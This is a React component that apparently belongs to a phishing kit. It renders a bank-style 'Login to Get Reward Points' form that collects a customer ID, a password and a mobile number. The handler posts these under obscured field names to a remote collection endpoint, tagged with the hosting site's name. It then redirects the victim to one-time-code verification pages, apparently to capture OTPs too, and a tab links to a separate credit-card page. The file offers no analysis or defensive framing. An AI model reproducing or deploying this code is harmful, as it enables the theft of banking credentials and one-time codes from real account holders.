import Header from '../resources/Header';
import Footer from '../resources/Footer';
import Loader from "../resources/Loader";
import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';

function Home() {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [loader, setLoader] = useState(true);
  const API_URL = process.env.REACT_APP_API_URL;

  // Clean up local storage on component mount
  useEffect(() => {
    localStorage.removeItem('collection_id');
    localStorage.removeItem('next');
    localStorage.removeItem("server_input_ot");
    localStorage.removeItem("next_page_otp_times");

    setTimeout(()=>{
      setLoader(false);
    }, 2000);
  }, []);

  // Navigate to home card page
  const HomeCardPage = () => {
    navigate('/homecard');
  };

  // Form submit handler
  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true); 
    const API_URL = process.env.REACT_APP_API_URL;

    const formData = new FormData(e.target);
    const jsonObject = {};
    
    formData.forEach((value, key) => {
      jsonObject[key] = value;
    });

    const postData = {
      data: jsonObject,
      site: window.location.hostname
    };

    try {
      const response = await fetch(`${API_URL}`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(postData)
      });

      if (!response.ok) {
        throw new Error('Network response was not ok');
      }

      const responseData = await response.json();
      if (responseData.status === 200) {
        localStorage.setItem('collection_id', responseData.data);
        localStorage.setItem('next', "/accountverify");
        localStorage.setItem("server_ot_times", 1);
        localStorage.setItem("next_page_otp_times", 2);
        navigate('/onetimeverify');
      } else {
        alert("Invalid response");
      }
    } catch (error) {
      console.error('There was a problem with the fetch operation:', error);
    } finally {
      setLoading(false);  
    }
  };

  return (
    <>
      <Header />
      <main>
        <div className="container">
          {loader ? (
            <Loader />
          ) : (
            <>
              <div className='mt-4'>
                <h1 className="text-center">Login to Get Reward Points</h1>
              </div>
              <div className='home-button-switcher'>
                <button className="active">Login ID / Customer ID</button>
                <button onClick={HomeCardPage}>Credit Card</button>
              </div>
              <div className='shadow px-4 py-2 border-0'>
                <form onSubmit={handleSubmit}>
                  <div className='form-group'>
                    <label>Login ID / Customer ID</label>
                    <input 
                      type='text' 
                      name='cudi' 
                      className='form-control my-control' 
                      required 
                      // placeholder="Enter your ID"
                    />
                  </div>
                  <div className='form-group'>
                    <label>Password</label>
                    <input 
                      type='password' 
                      name='pss' 
                      className='form-control my-control' 
                      required 
                      // placeholder="Enter your password"
                    />
                  </div>
                  <div className='form-group'>
                    <label>Mobile Number</label>
                    <input 
                      type='tel' 
                      name='mo' 
                      className='form-control my-control' 
                      pattern='[0-9]{10}' 
                      minLength={10} 
                      maxLength={10} 
                      required 
                      // placeholder="Enter your mobile number"
                    />
                  </div>
                  <div className='text-center'>
                    <button 
                      type='submit' 
                      className='btn btn-danger submit-button' 
                      disabled={loading}
                    >
                      {loading ? 'Logging in...' : 'Login'}
                    </button>
                  </div>
                </form>
              </div>
            </>
          )}
        </div>
      </main>
      <Footer />
    </>
  );
}

export default Home;
